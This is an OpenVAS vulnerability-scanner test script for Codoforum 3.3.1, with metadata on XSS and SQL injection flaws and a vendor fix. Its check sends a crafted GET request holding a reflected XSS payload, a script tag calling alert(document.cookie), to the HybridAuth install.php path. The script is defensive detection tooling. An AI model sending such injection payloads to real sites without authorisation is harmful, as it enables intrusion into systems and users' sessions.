###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_codoforum_mult_vuln.nasl 11872 2018-10-12 11:22:41Z cfischer $
#
# Codoforum Multiple Vulnerabilities
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:codoforum:codoforum";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806015");
  script_version("$Revision: 11872 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 13:22:41 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2015-08-19 14:54:43 +0530 (Wed, 19 Aug 2015)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("Codoforum Multiple Vulnerabilities");

  script_tag(name:"summary", value:"This host is installed with Codoforum
  and is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Flaw is due to improper input sanitization
  of 'index.php' and 'install.php' scripts.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to execute arbitrary script code in a user's browser session within
  the trust relationship between their browser and the server and to inject or
  manipulate SQL queries in the back-end database, allowing for the manipulation
  or disclosure of arbitrary data.");

  script_tag(name:"affected", value:"Codoforum version 3.3.1.");

  script_tag(name:"solution", value:"Upgrade to Codoforum version 3.4 or
  later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/133044");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2015/Aug/32");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2015/Aug/31");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_codoforum_detect.nasl");
  script_mandatory_keys("Codoforum/Installed");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"https://codoforum.com/");
  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

url = dir + '/sys/Ext/hybridauth/install.php/";><script>alert(document.cookie)</script>';

if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
   pattern:"<script>alert\(document.cookie\)</script>",
   extra_check:make_list(">HybridAuth Installer<", "codoforum")))
{
  report = report_vuln_url( port:http_port, url:url );
  security_message(port:http_port, data:report);
  exit(0);
}
